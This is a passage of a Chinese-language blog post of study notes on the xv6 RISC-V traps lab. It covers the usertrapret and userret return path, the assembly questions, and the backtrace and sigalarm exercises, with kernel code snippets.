该函数首先关闭中断。因为之前我们在系统调用过程中是打开了中断的，这里关闭中断是因为我们将要更新stvec寄存器来指向用户空间的trap处理代码，而之前在内核中的时候，我们指向的是内核空间的trap处理代码。我们关闭中断是因为当我们将stvec更新到指向用户空间的trap处理代码时，我们仍然在内核中执行代码。如果这时发生了一个中断，那么程序执行会走向用户空间的trap处理代码，即便我们现在仍然在内核中，处于各种各样具体细节的原因，这会导致内核出错。所以我们这里关闭中断。</span><br><span class="line"></span><br><span class="line">2. ```c</span><br><span class="line">     // send syscalls, interrupts, and exceptions to uservec in trampoline.S</span><br><span class="line">     uint64 trampoline_uservec = TRAMPOLINE + (uservec - trampoline);</span><br><span class="line">     w_stvec(trampoline_uservec);</span><br></pre></td></tr></table></figure>接着设置stvec寄存器指向trampoline代码，在那里终会执行sret指令返回到用户空间。位于trampoline代码的最后sret指令会重新打开中断。这样，即使我们刚刚关闭中断，当我们在执行用户代码时中断是打开的。</code></pre></li><li><pre><code class="c">  // set up trapframe values that uservec will need when  // the process next traps into the kernel.  p-&gt;trapframe-&gt;kernel_satp = r_satp();         // kernel page table  p-&gt;trapframe-&gt;kernel_sp = p-&gt;kstack + PGSIZE; // process&#39;s kernel stack  p-&gt;trapframe-&gt;kernel_trap = (uint64)usertrap;  p-&gt;trapframe-&gt;kernel_hartid = r_tp();         // hartid for cpuid()<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   接下来填入trapframe的内容，这些内容对于执行trampoline代码非常有用。</span><br><span class="line"></span><br><span class="line">   - 存储kernel page table的地址</span><br><span class="line">   - 存储当前用户进程的kernel stack</span><br><span class="line">   - 存储usertrap函数的地址，这样trampoline代码才能跳转到这个函数</span><br><span class="line">   - 从tp寄存器中读取当前的cpu核编号，并存储在trapframe中，这样trampoline代码才能恢复这个数字，因为用户代码可能会修改这个数字</span><br><span class="line"></span><br><span class="line">   现在我们在usertrapret函数中并正在设置trapframe中的数据，这样下一次从用户空间转换到内核空间时可以用到这些数据。</span><br><span class="line"></span><br><span class="line">4. ```c</span><br><span class="line">   // set S Previous Privilege mode to User.</span><br><span class="line">     unsigned long x = r_sstatus();</span><br><span class="line">     x &amp;= ~SSTATUS_SPP; // clear SPP to 0 for user mode</span><br><span class="line">     x |= SSTATUS_SPIE; // enable interrupts in user mode</span><br><span class="line">     w_sstatus(x);</span><br></pre></td></tr></table></figure>接下来设置sstatus寄存器，这是一个控制寄存器。这个寄存器的spp bit位控制了sret指令的行为，该bit为0表示下次执行sret时，我们想要返回到user mode 而不是 supervisor mode。这个寄存器的SPIE bit位控制了在执行完sret后是否打开中断。因为我们在返回到用户空间后，的确希望打开中断，所以我们这里设置SPIE bit 为1，修改完这些bit之后，我们会把新的值写回到sstatus寄存器。</code></pre></li><li><pre><code class="c"> // set S Exception Program Counter to the saved user pc.  w_sepc(p-&gt;trapframe-&gt;epc);<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   trampoline的最后会执行sret指令。这条指令会将程序计数器设置成spec寄存器的值，所以现在我们将sepc寄存器的值设置成之前保存的用户程序计数器的值。在不久之前，我们在usertrap函数中将用户程序计数器保存在trapframe中的epc字段。</span><br><span class="line"></span><br><span class="line">6. ```c</span><br><span class="line">    // tell trampoline.S the user page table to switch to.</span><br><span class="line">     uint64 satp = MAKE_SATP(p-&gt;pagetable);</span><br></pre></td></tr></table></figure>接着根据user page table地址生成相应的satp值，这样我们在返回到用户空间的时候才能完成page table的切换。实际上，我们会在汇编代码trampoline中完成page table的切换，并且也只能在trampoline中完成切换，因为只有trampoline中的代码是同时在用户和内核空间中映射的。但我们现在还没有在trampoline代码中，我们现在还在一个普通的c函数中，所以这里我们将page table地址准备好，并将这个地址作为参数传递给汇编代码，这个参数会出现在a0寄存器中。</code></pre></li><li><pre><code class="c">// jump to userret in trampoline.S at the top of memory, which // switches to the user page table, restores user registers,// and switches to user mode with sret.uint64 trampoline_userret = TRAMPOLINE + (userret - trampoline);((void (*)(uint64))trampoline_userret)(satp);<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   然后计算出我们将要跳转到的汇编代码的地址。我们期望跳转的地址是trampoline中的userret函数，这个函数包含了所有能将我们带回到用户空间的指令。所以这里我们计算出userret函数的地址。</span><br><span class="line"></span><br><span class="line">   最后一行将 trampoline_userret地址作为一个函数指针，执行相应的函数，即userret函数，并传入参数satp，存储在a0寄存器中。</span><br><span class="line"></span><br><span class="line">### userret 函数</span><br><span class="line"></span><br><span class="line">现在跳转到trampoline代码。</span><br><span class="line"></span><br><span class="line">```assembly</span><br><span class="line">.globl userret</span><br><span class="line">userret:</span><br><span class="line">        # userret(pagetable)</span><br><span class="line">        # called by usertrapret() in trap.c to</span><br><span class="line">        # switch from kernel to user.</span><br><span class="line">        # a0: user page table, for satp.</span><br><span class="line"></span><br><span class="line">        # switch to the user page table.</span><br><span class="line">        sfence.vma zero, zero# 清空页表缓存</span><br><span class="line">        csrw satp, a0</span><br><span class="line">        sfence.vma zero, zero # 清空页表缓存</span><br></pre></td></tr></table></figure></code></pre></li></ol><p>首先切换page table。在执行完<code>csrw satp, a0</code>之前，page table还是巨大的kernel page table。这条指令将a0寄存器中的值存储到satp中。执行完后page table变成了小得多的user page table。幸运的是user page table也映射了trampoline page，所以程序还能继续执行而不是崩溃。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">li a0, TRAPFRAME</span><br></pre></td></tr></table></figure><p>将trapframe的地址加载到a0中，到目前为止，所有的寄存器内容还是属于内核。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># restore all but a0 from TRAPFRAME</span><br><span class="line">        ld ra, 40(a0)</span><br><span class="line">        ld sp, 48(a0)</span><br><span class="line">        ld gp, 56(a0)</span><br><span class="line">        ld tp, 64(a0)</span><br><span class="line">        ld t0, 72(a0)</span><br><span class="line">        ld t1, 80(a0)</span><br><span class="line">        ld t2, 88(a0)</span><br><span class="line">        ld s0, 96(a0)</span><br><span class="line">        ld s1, 104(a0)</span><br><span class="line">        ld a1, 120(a0)</span><br><span class="line">        ld a2, 128(a0)</span><br><span class="line">        ld a3, 136(a0)</span><br><span class="line">        ld a4, 144(a0)</span><br><span class="line">        ld a5, 152(a0)</span><br><span class="line">        ld a6, 160(a0)</span><br><span class="line">        ld a7, 168(a0)</span><br><span class="line">        ld s2, 176(a0)</span><br><span class="line">        ld s3, 184(a0)</span><br><span class="line">        ld s4, 192(a0)</span><br><span class="line">        ld s5, 200(a0)</span><br><span class="line">        ld s6, 208(a0)</span><br><span class="line">        ld s7, 216(a0)</span><br><span class="line">        ld s8, 224(a0)</span><br><span class="line">        ld s9, 232(a0)</span><br><span class="line">        ld s10, 240(a0)</span><br><span class="line">        ld s11, 248(a0)</span><br><span class="line">        ld t3, 256(a0)</span><br><span class="line">        ld t4, 264(a0)</span><br><span class="line">        ld t5, 272(a0)</span><br><span class="line">        ld t6, 280(a0)</span><br></pre></td></tr></table></figure><p>接下来的指令将之前保存在trapframe中的寄存器的值加载到对应的各个寄存器中。之后，我们离能真正运行用户代码就很近了。</p><p>现在打印所有的寄存器。</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-02%2011.12.27.png" alt="截屏2024-03-02 11.12.27"></p><p>这些寄存器的值就是我们在最开始的时候看到的寄存器的值。但是a0寄存器现在还是个例外，它仍然指向trapframe的指针，而不是保存了的用户数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># restore user a0</span><br><span class="line"> ld a0, 112(a0)</span><br><span class="line">       </span><br><span class="line"> # return to user mode and user pc.</span><br><span class="line"> # usertrapret() set up sstatus and sepc.</span><br><span class="line"> sret</span><br></pre></td></tr></table></figure><p>接下来，我们将进入内核态前存储在trapframe + 112 处的用户态a0寄存器的值重新加载到a0中，然后执行我们在kernel中的最后一条指令sret，当我们执行完这条指令：</p><ul><li>程序会切换回user mode</li><li>sepc寄存器的数值会被拷贝到pc寄存器</li><li>重新打开中断</li></ul><p>现在我们回到了用户空间。打印pc寄存器</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-02%2011.21.13.png" alt="截屏2024-03-02 11.21.13"></p><p>程序计数器的值的确对应<code>sh.asm</code>文件中<code>write</code>函数的<code>ret</code>指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0000000000000e2c &lt;write&gt;:</span><br><span class="line">.global write</span><br><span class="line">write:</span><br><span class="line"> li a7, SYS_write</span><br><span class="line">     e2c:48c1                lia7,16</span><br><span class="line"> ecall</span><br><span class="line">     e2e:00000073          ecall</span><br><span class="line"> ret</span><br><span class="line">     e32:8082                ret</span><br></pre></td></tr></table></figure><p>所以我们回到了用户空间，执行完ret指令后就可以从write系统调用返回到shell中了。更严格的说，是从触发了系统调用的write库函数中返回到shell中。</p><p>最后总结一下，系统调用被刻意设计的看起来像是函数调用，但是背后的user&#x2F;kernel转换比函数调用要复杂的多。之所以这么复杂，很大一部分原因是要保持user&#x2F;kernel之间的隔离性，内核不能信任来自用户空间的任何内容。</p><p>另一方面，XV6实现trap的方式比较特殊，XV6并不关心性能。但是通常来说，操作系统的设计人员和CPU设计人员非常关心如何提升trap的效率和速度。必然还有跟我们这里不一样的方式来实现trap，当你在实现的时候，可以从以下几个问题出发：</p><ul><li>硬件和软件需要协同工作，你可能需要重新设计XV6，重新设计RISC-V来使得这里的处理流程更加简单，更加快速。</li><li>另一个需要时刻记住的问题是，恶意软件是否能滥用这里的机制来打破隔离性。</li></ul><h2 id="实验部分"><a href="#实验部分" class="headerlink" title="实验部分"></a>实验部分</h2><h3 id="RISC-V-assembly"><a href="#RISC-V-assembly" class="headerlink" title="RISC-V assembly"></a>RISC-V assembly</h3><p>知道一些RISC-V 汇编代码是重要的。在xv6资源中有<code>user/call.c</code>文件。通过make fs.img编译它并产生一些可读的程序汇编代码<code>user/call.asm</code></p><p>阅读call.asm中函数g、f和main的代码。RISC-V的说明手册在参考页面上。在answers-traps.txt中回答以下问题：</p><ul><li><p><code>Which registers contain arguments to functions? For example, which register holds 13 in main&#39;s call to printf ?</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;%d %d\n&quot;, f(8)+1, 13);</span><br><span class="line">24:4635                lia2,13</span><br></pre></td></tr></table></figure><p><code>a2</code>寄存器保存值13</p></li><li><p><code>Where is the call to function </code>f<code>in the assembly code for main? Where is the call to</code>g<code>? (Hint: the compiler may inline functions.)</code></p><p>对函数g 和函数f 已经被编译器内联，所以在汇编代码中没有对它们的调用</p></li><li><p>At what address is the function <code>printf</code> located?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000000000630 &lt;printf&gt;:</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">void main(void) &#123;</span><br><span class="line">  1c:1141                addsp,sp,-16</span><br><span class="line">  1e:e406                sdra,8(sp)</span><br><span class="line">  20:e022                sds0,0(sp)</span><br><span class="line">  22:0800                adds0,sp,16</span><br><span class="line">  printf(&quot;%d %d\n&quot;, f(8)+1, 13);</span><br><span class="line">  24:4635                lia2,13</span><br><span class="line">  26:45b1                lia1,12</span><br><span class="line">  28:00000517          auipca0,0x0</span><br><span class="line">  2c:7a850513          adda0,a0,1960 # 7d0 &lt;malloc+0xe8&gt;</span><br><span class="line">  30:00000097          auipcra,0x0</span><br><span class="line">  34:600080e7          jalr1536(ra) # 630 &lt;printf&gt;</span><br></pre></td></tr></table></figure><p>通过上面两段代码，我们可以知道函数<code>printf</code>的地址为<code>0x630</code></p></li><li><p><code>What value is in the register ra just after the jalr to printf in main ?</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">void main(void) &#123;</span><br><span class="line">  1c:1141                addsp,sp,-16</span><br><span class="line">  1e:e406                sdra,8(sp)</span><br><span class="line">  20:e022                sds0,0(sp)</span><br><span class="line">  22:0800                adds0,sp,16</span><br><span class="line">  printf(&quot;%d %d\n&quot;, f(8)+1, 13);</span><br><span class="line">  24:4635                lia2,13</span><br><span class="line">  26:45b1                lia1,12</span><br><span class="line">  28:00000517          auipca0,0x0</span><br><span class="line">  2c:7a850513          adda0,a0,1960 # 7d0 &lt;malloc+0xe8&gt;</span><br><span class="line">  30:00000097          auipcra,0x0</span><br><span class="line">  34:600080e7          jalr1536(ra) # 630 &lt;printf&gt;</span><br><span class="line">  exit(0);</span><br><span class="line">  38:4501                lia0,0</span><br><span class="line">  3a:00000097          auipcra,0x0</span><br><span class="line">  3e:28e080e7          jalr654(ra) # 2c8 &lt;exit&gt;</span><br></pre></td></tr></table></figure><blockquote><p>在执行<code>jalr</code>指令调用<code>printf</code>函数后，<code>ra</code>（返回地址寄存器）中的值将是该<code>jalr</code>指令的下一条指令的地址。<code>jalr</code>（Jump and Link Register）指令的作用是跳转到通过寄存器和偏移量计算得到的地址执行，并将下一条指令的地址（即<code>jalr</code>指令后面那条指令的地址）保存到<code>ra</code>寄存器中，以便函数执行完后可以通过<code>ra</code>寄存器中的地址返回到调用位置继续执行。</p></blockquote><p>在<code>jalr</code>指令后，<code>ra</code>寄存器将包含下一条指令的地址，即<code>exit(0)</code>对应的第一条地址<code>0x38</code>，这确保了在<code>printf</code>函数执行完后，程序能够通过<code>ra</code>寄存器中的返回地址继续执行。</p></li><li><pre><code>Run the following code.<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unsigned int i = 0x00646c72;</span><br><span class="line">printf(&quot;H%x Wo%s&quot;, 57616, &amp;i);</span><br><span class="line">     </span><br></pre></td></tr></table></figure>What is the output? [Here&#39;s an ASCII table](https://www.asciitable.com/) that maps bytes to characters.The output depends on that fact that the RISC-V is little-endian. If the RISC-V were instead big-endian what would you set `i` to in order to yield the same output? Would you need to change `57616` to a different value?</code></pre><p>输出<code>Hello World</code></p><p>在小端序系统中，使用<code>i = 0x00646c72;</code>。</p><p>要在大端序系统中获得相同的输出，应设置<code>i = 0x726c6400;</code>。</p><p><code>57616</code>的值保持不变</p></li><li><pre><code>In the following code, what is going to be printed after `&#39;y=&#39;`? (note: the answer is not a specific value.) Why does this happen?printf(&quot;x=%d y=%d&quot;, 3);<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&gt; 打印`x=3 y=`之后的内容不会是一个具体的值，而是未定义的行为（Undefined Behavior）。这是因为`printf`函数期望根据格式字符串中的占位符（这里有两个`%d`）接收相同数量的参数，但实际上只提供了一个参数（`3`）。对于第二个`%d`占位符，`printf`会尝试从调用的参数列表中读取下一个值来打印，但因为没有提供足够的参数，所以它会尝试读取未初始化的内存或超出了函数调用提供的参数范围的内存位置。</span><br><span class="line">&gt;</span><br><span class="line">&gt; 结果是，`y=`之后打印的值将是那个内存位置的当前值，这个值是不确定的，可能每次运行时都不同，甚至可能导致程序崩溃，因为这是典型的未定义行为。在C语言中，未定义行为意味着编译器不保证程序会有任何特定的行为，程序的行为可能不可预测。</span><br><span class="line">&gt;</span><br><span class="line">&gt; 为了避免这种情况，应该确保为`printf`（或任何函数）提供的参数数量与格式字符串中指定的占位符数量一致：</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>&gt; printf(&quot;x=%d y=%d&quot;, 3, /* 需要一个额外的整数参数 */);&gt; <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">只有这样，才能保证程序的正确和可预测的行为。</span><br><span class="line"></span><br><span class="line">### BackTrace</span><br><span class="line"></span><br><span class="line">为了调试，通常需要有一个回溯（backtrace）：在发生错误的点以上的堆栈上的函数调用列表。为了帮助进行回溯，编译器生成的机器码会在堆栈上为当前调用链中的每个函数维护一个堆栈帧。每个堆栈帧由返回地址和指向调用者堆栈帧的“帧指针”组成。寄存器`s0`包含指向当前堆栈帧的指针（实际上，它指向堆栈上保存的返回地址的地址加上8）。你的回溯应该使用帧指针在堆栈上向上遍历，并打印每个堆栈帧中保存的返回地址。</span><br><span class="line"></span><br><span class="line">在`kernel/printf.c`中实现`backtrace()`函数。在`sys_sleep`中插入对该函数的调用，然后执行`bttest`，该测试会调用sys_sleep。你的输出应该是一系列的返回地址，格式如下：</span><br><span class="line"></span><br></pre></td></tr></table></figure></code></pre></li></ul><blockquote><p>backtrace:<br>0x0000000080002cda<br>0x0000000080002bb6<br>0x0000000080002898</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">在`bitetest`退出qemu后。在终端窗口中运行：`addr2line -e kernel/kernel (or riscv64-unknown-elf-addr2line -e kernel/kernel)` 并复制粘贴`backtrace`中返回的地址：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>$ addr2line -e kernel&#x2F;kernel<br>0x0000000080002cda<br>0x0000000080002bb6<br>0x0000000080002898<br>Ctrl-D</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">终端会输出：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>kernel&#x2F;sysproc.c:74<br>kernel&#x2F;syscall.c:224<br>kernel&#x2F;trap.c:85</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">一些提示：</span><br><span class="line"></span><br><span class="line">- 在文件`kernel/defs.h`中添加`backtrace()`函数的原型，这样才能在`sys_sleep`中调用`backtrace`</span><br><span class="line"></span><br><span class="line">- GCC编译器将当前执行函数的栈桢指针（地址）保存在寄存器a0中。在`kernel/riscv.h`中添加如下函数：</span><br><span class="line"></span><br><span class="line"> ```c</span><br><span class="line"> static inline uint64 r_fp() &#123;</span><br><span class="line">   uint64 x;</span><br><span class="line">   asm volatile(&quot;mv %0, s0&quot; : &quot;=r&quot; (x) );</span><br><span class="line">   return x;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></blockquote><p>  然后调用函数<code>backtrace</code>读取当前栈帧。函数<code>r_fp</code>使用内联汇编代码读取<code>s0</code>。</p><ul><li><p>课程笔记有栈帧指针（地址）的分布情况。请注意，返回地址位于堆栈帧的帧指针的固定偏移处（-8），而保存的帧指针位于帧指针的固定偏移处（-16）。</p></li><li><p><code>backtrace()</code>函数需要能够识别到最后一个栈，然后停止。一个有用的事实是，为每个内核栈分配的内存由一个单独的、与页面对齐的页面组成，因此给定栈的所有栈帧都位于同一个页面上。你可以使用<code>PGROUNDDOWN(fp)</code>（参见<code>kernel/riscv.h</code>）来识别帧指针所指向的页面。</p></li></ul><p>一旦你的回溯功能正常工作，就从<code>kernel/printf.c</code>中的<code>panic</code>函数调用它，这样当内核出现panic时，你就能看到内核的回溯信息。</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-04%2019.43.45.png" alt="截屏2024-03-04 19.43.45"></p><h3 id="Alarm"><a href="#Alarm" class="headerlink" title="Alarm"></a>Alarm</h3><blockquote><p>在这个练习中，你将为xv6添加一个特性，该特性会定期提醒一个进程关于它所使用的CPU时间。这对于想要限制自己消耗CPU时间的计算密集型进程来说可能很有用，或者对于想要计算同时又想定期执行某些操作的进程来说也很有用。更一般地，你将实现一种原始形式的用户级中断&#x2F;故障处理器；例如，你可以使用类似的机制来处理应用中的页面故障。如果你的解决方案通过了alarmtest和’usertests -q’，则认为是正确的。</p></blockquote><p>你应该添加一个新的<code>sigalarm(interval, handler)</code>系统调用。如果一个应用程序调用了<code>sigalarm(n, fn)</code>，那么在程序消耗了每<code>n</code>个”ticks”的CPU时间后，内核应该使应用程序函数<code>fn</code>被调用。当<code>fn</code>返回时，应用程序应该从中断处继续执行。在xv6中，一个tick是一个相当任意的时间单位，由硬件定时器产生中断的频率决定。如果应用程序调用<code>sigalarm(0, 0)</code>，内核应该停止生成周期性的警报调用。</p><p>在你的xv6仓库中，你会找到一个名为<code>user/alarmtest.c</code>的文件。将它添加到Makefile中。在你添加了<code>sigalarm</code>和<code>sigreturn</code>系统调用之前（见下文），它不会正确编译。</p><p><code>alarmtest</code>在<code>test0</code>中调用<code>sigalarm(2, periodic)</code>，请求内核每2个ticks强制调用一次<code>periodic()</code>函数，然后进行一段时间的循环。你可以在<code>user/alarmtest.asm</code>中看到<code>alarmtest</code>的汇编代码，这可能对调试很有帮助。当<code>alarmtest</code>产生如下输出，并且<code>usertests -q</code>也正确运行时，你的解决方案就是正确的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">alarmtest</span></span><br><span class="line">test0 start</span><br><span class="line">........alarm!</span><br><span class="line">test0 passed</span><br><span class="line">test1 start</span><br><span class="line">...alarm!</span><br><span class="line">..alarm!</span><br><span class="line">...alarm!</span><br><span class="line">..alarm!</span><br><span class="line">...alarm!</span><br><span class="line">..alarm!</span><br><span class="line">...alarm!</span><br><span class="line">..alarm!</span><br><span class="line">...alarm!</span><br><span class="line">..alarm!</span><br><span class="line">test1 passed</span><br><span class="line">test2 start</span><br><span class="line">................alarm!</span><br><span class="line">test2 passed</span><br><span class="line">test3 start</span><br><span class="line">test3 passed</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">usertest -q</span></span><br><span class="line">...</span><br><span class="line">ALL TESTS PASSED</span><br><span class="line"><span class="meta prompt_">$</span></span><br></pre></td></tr></table></figure><p>完成这个任务时，你的解决方案只需要几行代码，但要做到正确可能会有些棘手。我们将使用原始仓库中的<code>alarmtest.c</code>版本来测试你的代码。你可以修改<code>alarmtest.c</code>来帮助你调试，但请确保原始的<code>alarmtest</code>表示所有测试都通过了。</p><h4 id="Test0-invoke-handler"><a href="#Test0-invoke-handler" class="headerlink" title="Test0: invoke handler"></a>Test0: invoke handler</h4><p>开始时，通过修改内核来跳转到用户空间的警报处理程序，这将导致<code>test0</code>打印”alarm!”。目前不用担心alarm后会发生什么；如果你的程序在打印”alarm!”之后崩溃，目前这样也是可以的。以下是一些提示：</p><ul><li><p>修改Makefile文件，是的<code>alarmtest.c</code>将被当作xv6的用户程序被编译</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UPROGS=\</span><br><span class="line">$U/_alarmtest\</span><br></pre></td></tr></table></figure></li><li><p>在<code>user/user.h</code>中声明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sigalarm</span><span class="params">(<span class="type">int</span> ticks, <span class="type">void</span> (*handler)())</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sigreture</span><span class="params">(<span class="type">void</span>)</span></span><br></pre></td></tr></table></figure></li><li><p>更新<code>user/usys.pl</code>（该文件会生成<code>user/usys.S</code>），<code>kernel/syscall.h</code>，和<code>kernel/syscall.c</code>以允许<code>alarmtest</code>调用<code>sigalarm</code>和<code>sigreturn</code>系统调用。</p><p>In <code>user/usys.pl</code>:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">entry(<span class="string">&quot;sigalarm&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;sigreturn&quot;</span>);</span><br></pre></td></tr></table></figure><p>In <code>kernel/syscall.h</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_sigalarm 22</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_sigreturn 23</span></span><br></pre></td></tr></table></figure><p>In <code>kernel/syscall.c</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_sigalarm</span><span class="params">(<span class="type">void</span>)</span>;   <span class="comment">// add syscall</span></span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_sigreturn</span><span class="params">(<span class="type">void</span>)</span>;  <span class="comment">// add syscall</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="title function_">uint64</span> <span class="params">(*syscalls[])</span><span class="params">(<span class="type">void</span>)</span> = &#123; </span><br><span class="line">  ...</span><br><span class="line">[SYS_sigalarm] sys_sigalarm,</span><br><span class="line">[SYS_sigreturn] sys_sigreturn,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>当前，<code>sys_sigreturn</code>只用返回0。</p></li><li><p>函数<code>sys_sigalarm</code>应该在结构体<code>proc</code>的新区域中保存<code>alarm interval</code>和<code>the pointer to the handler function</code>。</p><p>In <code>kernel/proc.h</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> &#123;</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="type">int</span> 